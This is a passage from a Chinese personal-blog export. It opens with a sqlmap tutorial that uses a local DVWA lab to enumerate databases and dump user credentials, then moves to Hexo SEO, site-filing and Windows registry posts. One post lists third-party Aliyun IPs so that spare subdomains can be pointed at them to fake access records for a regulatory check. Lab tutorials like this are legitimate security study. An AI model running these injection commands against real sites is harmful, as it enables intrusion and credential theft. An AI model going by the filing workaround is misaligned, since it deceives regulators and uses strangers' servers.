<p>结果显示如下<br><img src="/images/sqlmapbasicuse/2.png" alt="7597e5bf9a8503668c6acde63dee578f.png"><br>发现没有找到注入点。</p>
<p>从结果看发现我们是需要cookie的，然后去dvwa看一下cookie</p>
<p>然后在命令中加入cookie：</p>
<pre class="line-numbers language-bash"><code class="language-bash">
python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果出现以下结果则表明sqlmap检测到有可以注入的地方<br><img src="/images/sqlmapbasicuse/3.png" alt="30235e9a3dfae35f806441331df7a74e.png"></p>
<p><strong>(2)判断文本中的请求是否存在注入</strong></p>
<p>sqlmap可以从一个文本文件中获取http请求（这样的好处在于：不用设置其他参数，例如cookie、post数据等）</p>
<p>下图1.txt的内容是web数据包<br><img src="/images/sqlmapbasicuse/4.png" alt="dc032fb692dbd9e6ba6deb92354dfdf4.png"></p>
<p>sqlmap.py  -r  路径/1.txt</p>
<blockquote>
<p>注：-r一般存在cookie注入时使用</p>
</blockquote>
<p><strong>(3)查询当前用户下的所有数据库</strong></p>
<p>小提示：首先你要先确定有注入点，才能用该命令查询用户的数据库</p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py  -u  <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>执行后会拿到数据库信息<br><img src="/images/sqlmapbasicuse/5.png" alt="4079615a55a3fb4f22d5e5ff52dfe6f4.png"></p>
<p><strong>(4)获取数据库中表的信息</strong></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以拿到dvwa库中所有表的名字<br><img src="/images/sqlmapbasicuse/6.png" alt="bab165841e616ed70eea4fad1495fa91.png"></p>
<blockquote>
<p>注：将上一条命令中的–table缩写成-T时，表示在某表中继续查询<br>       若在该命令中不加-D参数来指定具体的数据库，那么sqlmap会把数据库中所有表列出</p>
</blockquote>
<p><strong>(5)获取表中的字段信息</strong></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa -T <span class="token function">users</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>拿到了表中的所有字段<br><img src="/images/sqlmapbasicuse/7.png" alt="8475adb05acdab6fc0b7197226e03087.png"></p>
<blockquote>
<p>注：在后续注入中 –columns可以缩写成-C</p>
</blockquote>
<p><strong>(6)获取字段内容</strong></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa -T <span class="token function">users</span> -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里获取的是dvwa数据库里的users表中的username和password的值<br><img src="/images/sqlmapbasicuse/8.png" alt="e61e6bfb9438a7f9b9c8bb5a5af80de8.png"></p>
<p><strong>(7)获取数据库的所有用户</strong></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>(8)获取数据库</strong></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --passwords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>(9)获取当前网站数据库的名称</strong></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/sqlmapbasicuse/9.png" alt="a9215034277537f3c18a2e891bf9640d.png"></p>
<p><strong>(10)获取当前网站数据库的用户名称</strong></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --current-user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/sqlmapbasicuse/10.png" alt="984c2a56621209c4e9284cd63103991b.png"></p>
]]></content>
      <tags>
        <tag>sqlmap</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客：您备案的网站未指向阿里云国内节点（不含香港）服务器，备案号可能被取消接入</title>
    <url>/aliyunbeianjinggao.html</url>
    <content><![CDATA[<p>工信部备案后一段时间会发来<br> <code>Hexo博客：您备案的网站未指向阿里云国内节点（不含香港）服务器，备案号可能被取消接入</code><br> 的短信警告，<br><img src="/images/aliyunbeianjinggao/1.jpg" alt="碰到问题不要慌"><br>下面讲述该问题的原因及解决方法。</p>
<span id="more"></span>
<h4 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h4><p>经检查您的网站域名 xxxxxx 未指向阿里云国内节点（不含香港）服务器且无访问记录 ，依据工信部相关法规规定属于空壳网站，请您尽快将域名解析IP地址指向阿里云国内节点（不含香港）服务器。 如果3个工作日后检查发现该备案域名在在阿里云国内节点（不含香港）服务器上仍无访问记录，我们将删除网站备案接入信息。您的备案号可能会被注销，网站访问可能受到影响。</p>
<p>这个问题常见于个人博客，特别是 hexo 博客，购买了域名，并且备了案，由于 hexo 博客静态托管于 Github Pages 或者 Coding Pages，所以也就没有阿里云的服务器，也就不可能存在域名解析IP地址指向阿里云国内节点服务器。<br><img src="/images/aliyunbeianjinggao/2.png" alt="278aa9789f80e5d30a8a121324e7c709.png"></p>
<h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><p>将你的域名添加一个二级域名，解析到某些阿里云国内节点服务器上就行了。例如我博客域名为 <a href="http://www.itrhx.com，就可以添加一个或者两个">www.itrhx.com，就可以添加一个或者两个</a> A 记录，记录值为阿里云国内节点服务器的 IP。然后<strong>隔一段时间访问一下</strong> 1.itrhx.com 或者 2.itrhx.com ，确保有一点儿访问量就行了。<br><img src="/images/aliyunbeianjinggao/3.png" alt="a8b964517570dcefe573e34daaa6ce99.png"><br>下面列出一些阿里云国内节点服务器 IP，挑一些能访问的就行了。</p>
<p>39.100.0.2 【恭喜，站点创建成功！】<br>39.100.0.16 【恭喜，站点创建成功！】<br>39.100.0.17 【恭喜，站点创建成功！】<br>39.100.0.23 【Document】<br>39.100.0.59 【恭喜，站点创建成功！】<br>39.100.0.64 【贵州鸿巨热力(集团)有限责任公司】<br>39.100.0.68 【恭喜，站点创建成功！】<br>39.100.0.75 【没有找到站点】<br>39.100.0.77 【Welcome to nginx!】<br>39.100.0.88 【恭喜，站点创建成功！】<br>39.100.0.94 【没有找到站点】<br>39.100.0.113 【IIS Windows Server】<br>39.100.0.117 【phpinfo()】<br>39.100.0.118 【没有找到站点】<br>39.100.0.119 【恭喜，站点创建成功！】<br>39.100.0.134 【宁夏塞上优家互联科技有限公司】<br>39.100.0.138 【没有找到站点】<br>39.100.0.149 【没有找到站点】<br>39.100.0.158 【没有找到站点】<br>39.100.0.159 【学点云管理后台】<br>39.100.0.167 【财经·新经济】<br>39.100.0.168 【苏州市相城区燃气有限责任公司】<br>39.100.0.169 【恭喜，站点创建成功！】<br>39.100.0.174 【The page is not foun】<br>39.100.0.177 【恭喜，站点创建成功！】<br>39.100.0.182 【IIS7】<br>39.100.0.192 【恭喜，站点创建成功！】<br>39.100.0.204 【恭喜，站点创建成功！】<br>39.100.0.209 【千胜ERP】<br>39.100.0.214 【LANMP一键安装包,集lamp,lnm】<br>39.100.0.238 【登录 - 大庆井下】<br>39.100.1.1 【上海美凯龙美学装饰工程有限公司ERP】<br>39.100.1.28 【恭喜，站点创建成功！】<br>39.100.1.44 【IIS Windows Server】<br>39.100.1.65 【恭喜，站点创建成功！】<br>39.100.1.68 【Test Page for the Ng】<br>39.100.1.95 【恭喜，站点创建成功！】</p>
]]></content>
  </entry>
  <entry>
    <title>win10下右键菜单添加“打开cmd”</title>
    <url>/cmdcaidan.html</url>
    <content><![CDATA[<p>最近使用cmd比较多，就想在某个文件夹下右键打开cmd，这样不用每次都在默认情况下切换目录。无奈win10 1703版本下shift+右键不能打开cmd，只能打开powershell。<br>好，那就自己整一个吧。</p>
<span id="more"></span>

<p>首先，在桌面新建一个文本文档。</p>
<pre class="line-numbers language-txt"><code class="language-txt">Windows Registry Editor Version 5.00



[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here]

@="在此处打开命令行"
"Icon"="cmd.exe"


[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command]

@="\"C:\\Windows\\System32\\cmd.exe\""



[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt]

@="在此处打开命令行"



[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command]

@="\"C:\\Windows\\System32\\cmd.exe\" \"cd %1\""



[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here]

@="在此处打开命令行"
"Icon"="cmd.exe"



[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command]

@="\"C:\\Windows\\System32\\cmd.exe\""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后、将上面内容粘贴到该文本文档中，保存。并将该文本文档以.reg结尾即可，名字可以随意取。（PS：@=”此处打开命令行”  该引号内文字可以随意修改成你想要显示的文字）</p>
<p>最后，双击注册一下就可以了，结果右键菜单中就有了。</p>
]]></content>
      <categories>
        <category>杂</category>
      </categories>
      <tags>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo个人博客SEO优化技巧</title>
    <url>/seoyouhua.html</url>
    <content><![CDATA[<h2 id="hexo个人博客SEO优化技巧"><a href="#hexo个人博客SEO优化技巧" class="headerlink" title="hexo个人博客SEO优化技巧"></a>hexo个人博客SEO优化技巧</h2><p>SEO定义:提高网站浏览量即更容易让百度推送到文章而做的优化手段。<br><a href="https://blog.csdn.net/yixu0534/article/details/92092386?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">具体的SEO介绍</a></p>
<span id="more"></span>
<h3 id="优化归档结构"><a href="#优化归档结构" class="headerlink" title="优化归档结构"></a>优化归档结构</h3><p>seo搜索引擎优化中，网站的最佳结构是用户从首页点击三次就可以到达任何一个页面，<br>但是我们使用hexo编译的站点打开文章的url是：sitename/year/mounth/day/title四层的结构，<br>这样的url结构很不利于seo，爬虫就会经常爬不到我们的文章，于是，我们可以将url直接改成sitename/title的形式，并且title最好是用英文，在根目录的配置文件下修改permalink如下</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">url</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//你的网站
<span class="token key atrule">root</span><span class="token punctuation">:</span> /
<span class="token key atrule">permalink</span><span class="token punctuation">:</span> <span class="token punctuation">:</span>title.html
permalink_defaults<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>重新hexo general后，随便打开一篇日志，url的绝对地址结构就改成 <a href="http://yoursite/title.xml">http://yoursite/title.xml</a> 了</p>
<h3 id="robots配置"><a href="#robots配置" class="headerlink" title="robots配置"></a>robots配置</h3><pre class="line-numbers language-txt"><code class="language-txt">User-agent: *
Allow: /
Allow: /home/
Allow: /archives/
Allow: /about/
Disallow: /vendors/
Disallow: /js/
Disallow: /css/
Disallow: /fonts/
Disallow: /vendors/
Disallow: /fancybox/
Sitemap: http://lansus.coding.me/sitemap.xml
Sitemap: http://lansus.coding.me/baidusitemap.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Allow表示允许被访问的，Disallow是不允许的意思。注意后面两个Sitemap就是网站地图了。而网站地图前面说了是给爬虫用的。这里配置在robots中。把上面的代码保存为robots.txt放入theme/yourtheme/source 。在编译后这个文件会出现在blog/public中。后面会使用到</p>
<p><a href="https://blog.csdn.net/lansus/article/details/89641760">参考文章</a></p>
]]></content>
      <categories>
        <category>hexoSEO</category>
      </categories>
      <tags>
        <tag>seo</tag>
      </tags>
  </entry>
  <entry>
    <title>ICP和公安网备案以及网站底部添加相应备案号</title>
    <url>/wangzhanbeian.html</url>
    <content><![CDATA[<h2 id="网站备案"><a href="#网站备案" class="headerlink" title="网站备案"></a>网站备案</h2><p>要分别进行公信网备案和公安备案然后部署在网站底部</p>
<span id="more"></span>
<h5 id="公信网备案"><a href="#公信网备案" class="headerlink" title="公信网备案"></a>公信网备案</h5><p>用阿里云，买一个服务器进行个人信息填写<br><img src="/images/wangzhanbeian/1.png" alt="ca1903480daa2dd58e1cf1ce8a35baa2.png"><br>等待一段时间（一周到三周不等）的审核后通过<br><img src="/images/wangzhanbeian/2.png" alt="39cfd992a4a42b30ceb0249cf81d452a.png"></p>
<h5 id="公安网备案"><a href="#公安网备案" class="headerlink" title="公安网备案"></a>公安网备案</h5><p>比较公信网，这个就要快很多<br>1.打开全国公安机关网站<a href="http://www.beian.gov.cn注册一个帐号登录">www.beian.gov.cn注册一个帐号登录</a></p>
<p>2.登录后会提示填写开办主体管理，如果没有提示登录后点击左边的菜单就行</p>
<p>3.填写主体相关的信息，比如个人，姓名，身份证等信息，然后保存</p>
<p>4.找到左边菜单新办网站申请，这点不用填写，直接点击下一步<br><img src="/images/wangzhanbeian/3.png" alt="f2395378ba06cdcd34bf805811c7dbc0.png"><br>接下来填写网站基本信息<br>包括网站开通日期，名称等，<br><strong>域名证书照片</strong>去域名网站下载，我的域名在阿里云购买，即可在阿里云点击管理域名<br><img src="/images/wangzhanbeian/4.png" alt="e456170389f729ba4e344fb6d3f71752.png"><br>域名证书下载处下载好图片上传即可</p>
<p>至于网络接入服务商信息和域名注册服务商信息<br>可在阿里云上搜索公安联网备案信息填写指南<br>里面的信息都有，也可问网站客服<br>下一步同主体负责人信息前的框都打上勾，然后提交等待审核就行了</p>
<p>后当地网安大队网警会让你填写两个表格</p>
<p>博客个人空间服务企业基础信息登记表.xls<br>和<br>交互式服务安全检查表.xls<br>然后等待通过即可</p>
<h2 id="底部添加ICP备案和公安网备案"><a href="#底部添加ICP备案和公安网备案" class="headerlink" title="底部添加ICP备案和公安网备案"></a>底部添加ICP备案和公安网备案</h2><p><a href="https://www.chingow.cn/posts/c7372a12.html">参考大佬文章</a><br>我们的网站已经有备案号了，但是应该如何添加备案号到博客最下面呢？</p>
<p>首先，在 主题配置文件  _config.yml 中的配置添加备案配置：<br>位置：<br>themes/next/_config.yml</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"> <span class="token comment" spellcheck="true"># 这里打开备案信息，填写ICP备案号   </span>
 <span class="token key atrule">beian</span><span class="token punctuation">:</span>   
 <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true  </span>
 <span class="token key atrule">icp</span><span class="token punctuation">:</span> 鲁ICP备20005811号 
 <span class="token comment" spellcheck="true"># 这里是新加的内容，填写公安备案信息</span>
 +  gongan<span class="token punctuation">:</span>
 +    enable<span class="token punctuation">:</span> <span class="token boolean important">true</span>
 +    local<span class="token punctuation">:</span> 鲁
 +    num<span class="token punctuation">:</span> <span class="token number">3711022000277</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将多余的注释掉，不然会报错<br><img src="/images/wangzhanbeian/5.png" alt="f260561f144f68fdcc2c91fbc46618a3.png"></p>
<p>然后，在语言配置文件里，添加表述文案beian：<br>位置:<br><code>themes/next/languages/zh-CN.yml</code><br><img src="/images/wangzhanbeian/6.png" alt="eab3fca27ff1e7456241e58f76a3f5e4.png"></p>
<p>接下来，删除原有的布局文件中备案样式的代码：(标注处全删)<br>位置:<br><code>themes/next/layout/_partials/footer.swig</code><br><img src="/images/wangzhanbeian/7.png" alt="5283d46f4a83dac14b69ea97c1f50d10.png"><br>找到如下位置插入一行代码：</p>
<pre><code> &lt;span class="author" itemprop="copyrightHolder"&gt;{{ theme.footer.copyright || author }}&lt;/span&gt;
     +  &lt;span class="post-meta-divider footer-ages-icon"&gt; | &lt;/span&gt;
    {% if config.symbols_count_time.total_symbols %}
 ```

最后，在主题布局文件中添加我们自定义的备案样式：
位置：
`themes/next/layout/_layout.swig`

&gt; 注意将公安网图标保存并命名/images/beian.png
```html
 </code><div class="footer-inner"><code>   
 	{{ partial('_partials/footer.swig', {}, {cache: theme.cache.enable}) }}    
 	{% include '_third-party/analytics/analytics-with-widget.swig' %}
 	+        </code><div class="footer-custom"><code>
 	+                    {% if theme.footer.beian.enable %}{#
 	+                  #}{{ next_url('http://www.beian.miit.gov.cn', theme.footer.beian.icp + ' ') }}{#
 	+                  #}{% endif %}
     +                  {% if theme.footer.beian.enable and theme.footer.gongan.enable %}
 	+                    <span class="post-meta-divider">|</span>
 	+                  {% endif %}
     +                  {% if theme.footer.gongan.enable %}{#
 	+                  #} <span style="padding-left:25px;background:url(/images/beian.png) no-repeat left center" rel="nofollow">{#
 	+                  #} {{ theme.footer.gongan.local}}{{__('footer.beian.gongan', next_url('http://www.beian.gov.cn/portal/registerSystemInfo?recordcode='+theme.footer.gongan.num, theme.footer.gongan.num )) }}{#
 	+                  #}{% endif %}
                      &lt;/div&gt;   
       {% block footer %}{% endblock %} 
 &lt;/div&gt;</span></code></div></div></pre><p>成功<br><img src="/images/wangzhanbeian/8.png" alt="3b991c5458d20080e149701386acf7ea.png"></p>
]]></content>
      <categories>
        <category>hexoSEO</category>
      </categories>
      <tags>
        <tag>备案</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客百度谷歌收录</title>
    <url>/baidugoogleseo.html</url>
    <content><![CDATA[<h3 id="Hexo博客百度收录（SEO）"><a href="#Hexo博客百度收录（SEO）" class="headerlink" title="Hexo博客百度收录（SEO）"></a>Hexo博客百度收录（SEO）</h3><p>曾迫不及待地想在百度上找到我的博文，可是找不到<br>后发现还要有百度收录操作才可显示<br>那就开始吧！</p>
<span id="more"></span>
<p><strong>1.</strong> 百度搜索自己的域名，会发现找不到，显示<br><img src="/images/HexoSEO/1.png" alt="ec4ca260ed1644a3e0c5133e2fd88cf4.png"><br>点击提交网址，并登录<br>提交好网站后没有下文……<br><strong>2.</strong> 验证网站的所有权<br>登录百度站长平台 ,<br>登录成功之后在站点管理中点击添加网站然后输入你的站点地址，建议输入的网站为www开头的，</p>
<blockquote>
<p>注意：不要输入github.io的，因为github是不允许百度的spider爬取github上的内容的，所以如果想让你的站点被百度收录，只能使用自己购买的域名</p>
</blockquote>
<p>在选择完网站的类型后需要验证网站的所有权，验证网站所有权的方式有三种：文件验证,html标签验证和cname解析验证，使用哪一种方式都可以。</p>
<blockquote>
<p>坑：我用的是文件验证</p>
<p><strong><em>将验证文件放置于您所配置域名&gt;(<a href="http://www.marmalade.vip)的根目录下">www.marmalade.vip)的根目录下</a></em></strong><br>根目录是网站的source文件夹<br>但是<br><img src="/images/HexoSEO/2.png" alt="a2cf1b8aa1e383d1972f556175d0970a.png"><br>验证失败？<br>果断放弃!</p>
</blockquote>
<p>采用第三种cname方法<br>域名解析增加一条<br><img src="/images/HexoSEO/3.png" alt="1ba07eae2c660763c8d19364d515b14d.png"><br>成功！<br><img src="/images/HexoSEO/4.png" alt="66a9ea7ee351dc7b8666285c533052dc.png"></p>
<p><strong>3.</strong> 生成网站地图<br>先安装sitemap插件<br>cmd添加两个插件</p>
<pre><code>npm install hexo-generator-sitemap --save

npm install hexo-generator-baidu-sitemap --save12</code></pre><p>修改博客路径下的配置文件（非主题）中的url站点地址为自己网址<br> 执行完之后就会在博客路径下生成sitemap.xml文件和baidusitemap.xml文件，<br>可以通过http://你的域名/baidusitemap.xml,<br>查看该文件是否生成，其中sitemap.xml文件是搜索引擎通用的文件，<br> baidusitemap.xml是百度专用的sitemap文件</p>
<p><strong>4.</strong> 向百度提交链接<br>百度站长平台的数据引入，链接提交<br>选择主动推送</p>
<blockquote>
<h5 id="主动推送"><a href="#主动推送" class="headerlink" title="主动推送"></a>主动推送</h5><p>安装插件<br>npm install hexo-baidu-url-submit –save</p>
</blockquote>
<p>然后在根目录的配置文件中新增字段</p>
<pre><code>baidu_url_submit: 
 count: 100 ## 比如100，代表提交最新的一百个链接
 host: guoyanjun.top ## 在百度站长平台中注册的域名
 token: your_token ## 刚刚复制的秘钥，不要公布到任何地方。
 path: baidu_urls.txt ## 文本文档的地址，新链接会保存在此文本文档里</code></pre><p>在deploy里添加新的配置项</p>
<pre><code>deploy: 
 - type: git # 原来就有的
 repo: 巴拉巴拉
 branch: master 
 message: blog update 
 - type: baidu_url_submitter # 注意，这个为新增的</code></pre><p><strong>结果报错：？？？</strong></p>
<p><img src="/images/HexoSEO/5.png" alt="44b0cd11f2f4cb20745d82a709148306.png"><br>百度这个错误<br><a href="https://blog.csdn.net/elgong/article/details/97839395">hexo错误 TypeError: Cannot read property ‘count’ of undefined</a></p>
<blockquote>
<p>解决方案：</p>
<p>npm remove hexo-baidu-url-submit<br>hexo clean<br>hexo g</p>
<p>删除百度自动提交就好了。</p>
</blockquote>
<p>可是删除了百度自动提交不就不行了？？？<br>暂时删除<br>以后每次hexo个 g -d<br>会提示<br><img src="/images/HexoSEO/6.png" alt="202c95616dea93d1870b4da3c452eb2e.png"></p>
<p><strong><em>过了很久以后</em></strong><br>忍不住又使用了一遍指令<br>npm install hexo-baidu-url-submit –save</p>
<h6 id="结果这次hexo-g-d不报错了！？？"><a href="#结果这次hexo-g-d不报错了！？？" class="headerlink" title="结果这次hexo g -d不报错了！？？"></a><strong><em>结果这次hexo g -d不报错了！？？</em></strong></h6><p>所以成功！</p>
<blockquote>
<p>参考文章：<br><a href="https://blog.csdn.net/Ivan_zcy/article/details/82938260">如何让hexo博文被百度收录</a></p>
</blockquote>
<h3 id="链接提交：自动推送"><a href="#链接提交：自动推送" class="headerlink" title="链接提交：自动推送"></a>链接提交：自动推送</h3><p>进入主题配置文件，开启baidu_push(fause变为true)<br><img src="/images/HexoSEO/7.png" alt="3f2a9dae745aaf66fa957dde3e8c8fe0.png"></p>
<p>站点根目录\themes\next\layout_scripts目录，修改baidu_push.swig文件为以下内容，若无该文件直接创建一个</p>
<pre><code>{% if theme.baidu_push %}
<script>
(function()&#123;
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') &#123;
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    &#125;
    else &#123;
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    &#125;
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
&#125;)();
</script>
{% endif %}</code></pre><p>重新编译生成部署即可，这样每次访问一个页面都会主动把这个页面的地址提交给百度<br>访问博客任一页面，然后按F12，切换到Elements，如果看到如下代码说明以上js代码插入成功<br><img src="/images/HexoSEO/8.png" alt="6146748ff883ba414b1e01d641d475be.png"></p>
<h3 id="sitemap提交"><a href="#sitemap提交" class="headerlink" title="sitemap提交"></a>sitemap提交</h3><p>在百度站长平台找到链接提交，自动提交中找到sitemap<br>将以下两行（域名写自己的）提交，然后等待回复就可以啦<br><a href="https://marmalade.vip/baidusitemap.xml">https://marmalade.vip/baidusitemap.xml</a><br><a href="https://marmalade.vip/sitemap.xml">https://marmalade.vip/sitemap.xml</a><br><img src="/images/HexoSEO/9.png" alt="893dc490024a13ce5c879d7b5ec42925.png"></p>
<h3 id="谷歌收录"><a href="#谷歌收录" class="headerlink" title="谷歌收录"></a>谷歌收录</h3><p>需要范强才可，首先要有一个谷歌账号<br>打开该网址<br><code>https://search.google.com/</code><br>登录后输入自己的域名会有DNS域名所有权验证<br><img src="/images/HexoSEO/10.png" alt="4826e3fcf6a817d2adcfb959bfe6e6f6.png"></p>
<p>要用到域名解析，打开自己域名的域名解析界面，<br><img src="/images/HexoSEO/11.png" alt="6678138a3ceba3134e430d119eb5e49f.png"></p>
<p>添加TXT记录，完成DNS验证<br><img src="/images/HexoSEO/12.png" alt="b69491d9868012b841bf03452b03e9c1.png"></p>
<p>对应值：2017030909245xxxxxxxxxxxxxxxxxx（直接复制 “记录值”输入），</p>
<blockquote>
<p>（如果是二级域名，比如west.qk365.vip，主机名就是 &gt;“west”，对应值复制输入系统提示的 “记录值”）</p>
</blockquote>
<p>然后等待一天后可进入管理页面</p>
<p>直接在站点控制台添加<br><img src="/images/HexoSEO/13.png" alt="6c68a6c05cead57cca8df9a728bda11d.png"><br>即提交成功</p>
<h5 id="添加蜘蛛协议"><a href="#添加蜘蛛协议" class="headerlink" title="添加蜘蛛协议"></a>添加蜘蛛协议</h5><p>蜘蛛协议就是告诉爬虫，你的哪些文件爬虫可以爬取，哪些不能的文件。新建一个robots.txt文件，添加以下内容，然后放到/yoursite/source/文件夹下面：</p>
<pre><code>User-agent: *Allow: /
Allow: /archives/
Allow: /tags/
Allow: /categories/
Allow: /about/
Disallow: /js/Disallow: /css/
Disallow: /lib/
Sitemap: 刚刚sitemap的地址</code></pre><p>在百度站长平台，左侧，Robots里面可以检测你写的是否正确：<br><img src="/images/HexoSEO/14.png" alt="94e08374e20e16a2fe0e80ad92276bd1.png"></p>
<h3 id="禁止爬虫跟踪外链"><a href="#禁止爬虫跟踪外链" class="headerlink" title="(禁止爬虫跟踪外链)"></a>(禁止爬虫跟踪外链)</h3><p>当你提交了链接，写好了蜘蛛爬取协议之后，搜索引擎的蜘蛛就会来爬取你的文章内容。但是，如果你的文章中有外链，蜘蛛就会通过这个链接到别人的站点去。如果这个站点是友情链接还好，如果是非友链，就回严重影响网站的爬取。<br>为了避免蜘蛛进入非友情链接，需要为非友链添加上nofollow属性。推荐使用hexo-autonofollow插件。<br>在站点根目录下执行：</p>
<pre><code>npm install hexo-autonofollow --save</code></pre><p>修改站点配置文件，添加如下内容：</p>
<pre><code>nofollow: 
  enable: true   
  exclude: # 例外链接  
  - 你自己的站点地址  
  - 友链地址</code></pre><p>这样，例外的链接就不会被加上nofollow属性。</p>
<blockquote>
<p>注：插件自动添加的属性为external nofollow noopener &gt;noreferrer。一般来说标准的nofollow属性只需要external &gt;nofollow即可，noopener noreferrer估计是新闻上说的钓鱼漏&gt;洞的补救方法，不过这条属性会影响站长工具的友链检测。</p>
</blockquote>
<p>如果想要去掉noopener noreferrer，修改/yoursite/node_modules/hexo-autonofollowlib/filter.js：</p>
<pre><code>rel: 'external nofollow noopener noreferrer'</code></pre><p>去掉其中的noopener noreferrer，再生成即可。</p>
]]></content>
      <categories>
        <category>hexoSEO</category>
      </categories>
      <tags>
        <tag>seo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（四）</title>
    <url>/hexothemebeautify4.html</url>
    <content><![CDATA[<p>自定义文章底部版权声明<br>在每篇文章末尾添加“本文结束”标记<br>字数统计和阅读时长(网站底部/文章内)<br>添加文章置顶功能</p>
<span id="more"></span>
<h3 id="14-Hexo博客NexT主题美化之自定义文章底部版权声明"><a href="#14-Hexo博客NexT主题美化之自定义文章底部版权声明" class="headerlink" title="(14)Hexo博客NexT主题美化之自定义文章底部版权声明"></a>(14)Hexo博客NexT主题美化之自定义文章底部版权声明</h3><p><a href="https://blog.pangao.vip/Hexo%E5%8D%9A%E5%AE%A2NexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%E4%B9%8B%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E7%AB%A0%E5%BA%95%E9%83%A8%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/">参考文章</a><br><strong>效果如下</strong><br><img src="/images/beautify4/1.png" alt="4ae7368fbd9bb2ab52f9f8d2eb35b508.png"></p>
